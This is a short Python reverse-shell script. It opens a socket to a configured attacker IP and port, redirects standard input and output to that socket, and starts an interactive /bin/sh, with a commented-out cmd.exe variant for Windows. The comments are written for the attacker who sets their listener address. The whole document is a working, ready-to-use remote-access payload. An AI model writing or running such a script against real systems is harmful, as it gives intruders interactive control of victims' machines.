import socket
import subprocess
import os

# Configure attacker's IP and port
ATTACKER_IP = "192.168.1.10"  # Change to your attacking machine's IP
ATTACKER_PORT = 4444            # Change to your listener port

# Create a socket and connect back to attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect stdin, stdout, stderr to the socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Start an interactive shell
subprocess.call(["/bin/sh", "-i"])  # Linux
# subprocess.call(["cmd.exe", "/k"])  # Windows (uncomment for Windows)